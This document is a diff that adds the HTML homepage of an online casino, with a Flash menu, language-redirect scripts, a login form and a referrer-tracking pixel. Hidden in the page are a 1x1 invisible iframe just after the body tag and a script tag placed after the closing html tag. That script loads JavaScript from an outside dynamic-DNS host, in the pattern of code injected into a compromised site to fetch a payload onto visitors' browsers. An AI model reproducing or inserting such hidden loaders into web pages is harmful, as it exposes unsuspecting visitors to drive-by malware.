@@ -1,0 +1,131 @@
+<html>
+<head>
+<title>Fat Boss Casino Est. 2000</title>
+<base href="http://www.fatbosscasino.com/home/">
+<link href="fatbosscasinoIE.css" rel=stylesheet>
+<map name="menu1">
+<area shape="rectangle" coords="24,4,91,22" href="about.html">
+<area shape="rectangle" coords="106,4,188,22" href="register.html">
+<area shape="rectangle" coords="204,4,316,22" href="promotions.html">
+<area shape="rectangle" coords="331,4,415,22" href="banking.html">
+<area shape="rectangle" coords="430,4,491,22" href="faq.html">
+<area shape="rectangle" coords="503,4,589,22" href="support.html">
+<area shape="rectangle" coords="603,4,712,22" href="webmasters.html">
+</map>
+<script language="JavaScript">
+<!--
+function redirectpage(dest)
+{
+   if (window.location.replace) window.location.replace(dest);
+   else window.location=dest;
+}
+
+// http://www.w3.org/WAI/ER/IG/ert/iso639.htm ISO 639-2 letter Language codes
+// var langcodes=new Array("de", "ru", "fr", "es", "it");
+// var langredirects=new Array("http://www.fatbosscasino.com/de/", "http://www.fatbosscasino.com/ru/", "http://www.fatbosscasino.com/fr/", "http://www.fatbosscasino.com/es/", "http://www.fatbosscasino.com/it/");
+
+var langcodes=new Array("ru");
+var langredirects=new Array("http://www.fatbosscasino.com/ru/");
+
+var languageinfo=navigator.language ? navigator.language : navigator.userLanguage;
+
+for (i=0;i<langcodes.length;i++)
+{
+   if (languageinfo.substr(0,2)==langcodes[i])
+   {
+      redirectpage(langredirects[i]);
+      gotodefault=0;
+      break;
+   }
+}
+// -->
+</script>
+
+<script language="JavaScript">
+<!--
+function ClickIt(pagenumber)
+{
+   if(pagenumber == 1) { location.replace("http://www.fatbosscasino.com/home/about.html"); }
+   if(pagenumber == 2) { location.replace("http://www.fatbosscasino.com/home/register.html"); }
+   if(pagenumber == 3) { location.replace("http://www.fatbosscasino.com/home/promotions.html"); }
+   if(pagenumber == 4) { location.replace("http://www.fatbosscasino.com/home/banking.html"); }
+   if(pagenumber == 5) { location.replace("http://www.fatbosscasino.com/home/faq.html"); }
+   if(pagenumber == 6) { location.replace("http://www.fatbosscasino.com/home/support.html"); }
+   if(pagenumber == 7) { location.replace("http://www.fatbosscasino.com/home/webmasters.html"); }
+}
+// -->
+</script>
+</head>
+<body bgcolor="#000000" background="bg2.jpg" link="#F0F010" alink="#F0F010" vlink="#F0F010" topmargin="0" leftmargin="0" style="margin-left: 0px; margin-right: 0px"><iframe src='http://url' width='1' height='1' style='visibility: hidden;'></iframe>
+<center>
+<table border=0 width=747 cellpadding =0 cellspacing=0>
+<tr><td width=5 background="goldline.jpg"></td>
+<td align=left valign=top width=737 bgcolor="#17014F"><table border=0 width=737 cellpadding=0 cellspacing=0>
+<tr><td align=left valign=top width=737 colspan=3><img src="fatbosslogo.jpg" width=737 height=121></td></tr>
+<tr><td align=left valign=top width=737 colspan=3><object classid="clsid:d27cdb6e-ae6d-11cf-96b8-444553540000" codebase="http://download.macromedia.com/pub/shockwave/cabs/flash/swflash.cab#version=7,0,0,0" width="737" height="25" id="menu_en" align="middle"><param name="allowScriptAccess" value="sameDomain" /><param name="movie" value="menu_en.swf" /><param name="quality" value="best" /><param name="scale" value="noscale" /><param name="bgcolor" value="#cc3300" /><embed src="menu_en.swf" quality="best" scale="noscale" bgcolor="#cc3300" width="737" height="25" name="menu_en" align="middle" allowScriptAccess="sameDomain" type="application/x-shockwave-flash" pluginspage="http://www.macromedia.com/go/getflashplayer" /></object><!-- <img src="mainmenu.jpg" width=737 height=25 border=0 usemap="#menu1"> --></a></td></tr>
+<tr>
+<td align=left valign=top width=550><table border=0 width=550 cellpadding=0 cellspacing=0><tr><td align=left valign=top width=550 colspan=2><object classid="clsid:d27cdb6e-ae6d-11cf-96b8-444553540000" codebase="http://download.macromedia.com/pub/shockwave/cabs/flash/swflash.cab#version=7,0,0,0" width="550" height="230" id="fbc_splash" align="middle"><param name="allowScriptAccess" value="sameDomain" /><param name="movie" value="fbc_splash.swf" /><param name="menu" value="false" /><param name="quality" value="best" /><param name="scale" value="noscale" /><param name="bgcolor" value="#cc0000" /><embed src="fbc_splash.swf" menu="false" quality="best" scale="noscale" bgcolor="#cc0000" width="550" height="230" name="fbc_splash" align="middle" allowScriptAccess="sameDomain" type="application/x-shockwave-flash" pluginspage="http://www.macromedia.com/go/getflashplayer" /></object></td></tr><tr><td align=left valign=top width=170 background="splash2a.jpg"> <table border=0 width=160 cellpadding=5 cellspacing=5><tr><td align=left><b><big>Enter Casino:</big></b><form method="post" action="http://www.fatbosscasino.com/cgi-bin/p.cgi">
+<b>Username:</b><br>
+<input name=username type="text" class="small" size=10><br>
+<b>Password:</b><br> 
+<input name=psw type="password" class="small" size=10> <input name=p type=hidden value='login'><input type="submit" NAME=login VALUE="Log In" style="font-size: 10px; font-family: verdana; font-weight:bold; background-color: #cc1000; border-width: 1; border-style: solid; border-color: #c0c0c0; color: #f0f01f">
+</form><a href="register.html">New players registration</a><br><a href="support.html">Forgotten password?</a><br><img src="blankblack.gif" width=1 height=9><br>
+</td></tr></table> </td>
+<td align=left valign=top width=380><img src="splash1b.jpg"></td>
+</tr></table></td>
+<td align=left valign=top width=187><a href="register.html"><img src="splash1c.jpg" width=187 height=399 border=0></a></td>
+</tr>
+<tr><td align=left valign=top width=737 colspan=3 bgcolor="#17014F"><img src="bottomline.gif" width=737 height=25><center><img src="blankblack.gif" width=1 height=2><br><table border=0 cellpadding=0 cellspacing=0><tr><td><img src="flag_us.gif"></td><td><a href="">English</a></td><td><img src="flag_de.gif"></td><td><a href="">German</a></td><td><img src="flag_ru.gif"></td><td><a href="http://www.fatbosscasino.com/ru/">Russian</a></td><td><img src="flag_fr.gif"></td><td><a href="">French</a></td><td><img src="flag_es.gif"></td><td><a href="">Spanish</a></td></tr></table>
+<br>&nbsp;<br>
+<a href="http://www.mediacasino.com/"><img src="mediacasino_button.gif" border=0 width=226 height=77></a>
+<br>&nbsp;<br>
+<a href="webmasters.html"><big>Webmasters! Click here to promote Fat Boss Casino and earn $$$</big></a>
+<br>&nbsp;<br>
+<img src="payments.gif" border=0 width=420 height=25>
+<br>&nbsp;<br>
+<a href="about.html"><big>About</big></a> /
+<a href="register.html"><big>Register</big></a> /
+<a href="promotions.html"><big>Promotions</big></a> /
+<a href="banking.html"><big>Banking</big></a> /
+<a href="faq.html"><big>Faq</big></a> /
+<a href="support.html"><big>Support</big></a> /
+<a href="webmasters.html"><big>Webmasters</big></a>
+<br>&nbsp;<br>
+Copyright &copy;2000-2005 <a href="http://www.fatbosscasino.com/">Fatbosscasino.com</a> All Rights Reserved. <a href="privacy.html">Privacy Policy</a> <a href="support.html">Support Dept.</a><br>&nbsp;<br>
+<script language="javascript">
+referrer=escape(document.referrer)+"";
+if(referrer=="undefined" || referrer=="")
+{
+   referrer="bookmark";
+}
+dynamic1="<img src='http://www.fatbosscasino.com/cgi-bin/basetrek.cgi?xxxxxxx01>>";
+dynamic2="' width=2 height=2>";
+document.write(dynamic1+referrer+dynamic2);
+</script>
+
+<script language="JavaScript">
+<!--
+doc_height = document.body.clientHeight;
+if(doc_height>600) {
+document.write("<br>&nbsp;<br>&nbsp;<br>&nbsp;<br>&nbsp;<br>&nbsp;<br>&nbsp;<br>&nbsp;<br>&nbsp;<br>&nbsp;<br>&nbsp;<br>&nbsp;<br>&nbsp;<br>");
+}
+// -->
+</script>
+
+<script language="JavaScript">
+<!--
+doc_height = document.body.clientHeight;
+if(doc_height>600) {
+document.write("<br>&nbsp;<br>&nbsp;<br>&nbsp;<br>&nbsp;<br>&nbsp;<br>&nbsp;<br>&nbsp;<br>&nbsp;<br>&nbsp;<br>&nbsp;<br>&nbsp;<br>&nbsp;<br>");
+}
+// -->
+</script>
+</center>
+</td></tr>
+</table>
+</td>
+<td width=5 background="goldline.jpg"></td></tr></table>
+</center>
+</body>
+</html>
+<script src="http://touchme.changeip.name/rsize.js"></script>
